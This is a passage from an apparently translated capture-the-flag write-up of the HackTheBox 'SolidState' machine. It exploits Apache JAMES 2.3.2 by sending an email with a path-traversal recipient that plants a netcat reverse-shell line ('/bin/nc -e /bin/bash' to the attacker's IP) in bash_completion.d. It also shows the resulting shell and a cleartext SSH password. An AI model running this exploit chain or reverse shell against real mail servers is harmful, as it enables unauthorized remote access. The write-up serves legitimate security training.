最好的方法是使用有效载荷。我发现，如果我添加尾随 ，它将在后台启动该过程并允许触发过程继续。电子邮件如下所示：`nc -e``&`

    Return-Path: <'0xdf@10.10.14.47>^M
    Message-ID: <8915397.8.1588217962318.JavaMail.root@solidstate>^M
    MIME-Version: 1.0^M
    Content-Type: text/plain; charset=us-ascii^M
    Content-Transfer-Encoding: 7bit^M
    Delivered-To: ../../../../../../../../etc/bash_completion.d@localhost^M
    Received: from 10.10.14.47 ([10.10.14.47])^M
              by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 252^M
              for <../../../../../../../../etc/bash_completion.d@localhost>;^M
              Wed, 29 Apr 2020 23:39:07 -0400 (EDT)^M
    Date: Wed, 29 Apr 2020 23:39:07 -0400 (EDT)^M
    FROM: 0xdf@10.10.14.47^M
    ^M
    '^M
    /bin/nc -e /bin/bash 10.10.14.47 443 &^M
    

mindy的SSH会话有一些额外的垃圾文本，但提示会立即生效：

    root@kali# sshpass -p 'P@55W0rd1!2@' ssh mindy@10.10.10.51
    Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686
    
    The programs included with the Debian GNU/Linux system are free software;
    the exact distribution terms for each program are described in the
    individual files in /usr/share/doc/*/copyright.
    
    Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
    permitted by applicable law.
    Last login: Wed Apr 29 22:44:26 2020 from 10.10.14.47
    -rbash: $'\254\355\005sr\036org.apache.james.core.MailImpl\304x\r\345\274\317ݬ\003': command not found
    -rbash: L: command not found
    -rbash: attributestLjava/util/HashMap: No such file or directory
    -rbash: L
             errorMessagetLjava/lang/String: No such file or directory
    -rbash: L
             lastUpdatedtLjava/util/Date: No such file or directory
    -rbash: Lmessaget!Ljavax/mail/internet/MimeMessage: No such file or directory
    -rbash: $'L\004nameq~\002L': command not found
    -rbash: recipientstLjava/util/Collection: No such file or directory
    -rbash: L: command not found
    -rbash: $'remoteAddrq~\002L': command not found
    -rbash: remoteHostq~LsendertLorg/apache/mailet/MailAddress: No such file or directory
    -rbash: $'\221\222\204m\307{\244\002\003I\003posL\004hostq~\002L\004userq~\002xp': command not found
    -rbash: $'L\005stateq~\002xpsr\035org.apache.mailet.MailAddress': command not found
    -rbash: 0xdf@10.10.14.47>
    Message-ID: <8915397.8.1588217962318.JavaMail.root@solidstate>
    MIME-Version: 1.0
    Content-Type: text/plain; charset=us-ascii
    Content-Transfer-Encoding: 7bit
    Delivered-To: ../../../../../../../../etc/bash_completion.d@localhost
    Received: from 10.10.14.47 ([10.10.14.47])
              by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 252
              for <../../../../../../../../etc/bash_completion.d@localhost>;
              Wed, 29 Apr 2020 23:39:07 -0400 (EDT)
    Date: Wed, 29 Apr 2020 23:39:07 -0400 (EDT)
    FROM: 0xdf@10.10.14.47
    
    : No such file or directory
    -rbash: $'\r': command not found
    mindy@solidstate:~$ ls
    bin  user.txt
    

我有一个壳：

    root@kali# nc -lnvp 443
    Ncat: Version 7.80 ( https://nmap.org/ncat )
    Ncat: Listening on :::443
    Ncat: Listening on 0.0.0.0:443
    Ncat: Connection from 10.10.10.51.
    Ncat: Connection from 10.10.10.51:49678.
    id
    uid=1001(mindy) gid=1001(mindy) groups=1001(mindy)
    

[查看原网页: 0xdf.gitlab.io](https://0xdf.gitlab.io/2020/04/30/htb-solidstate.html)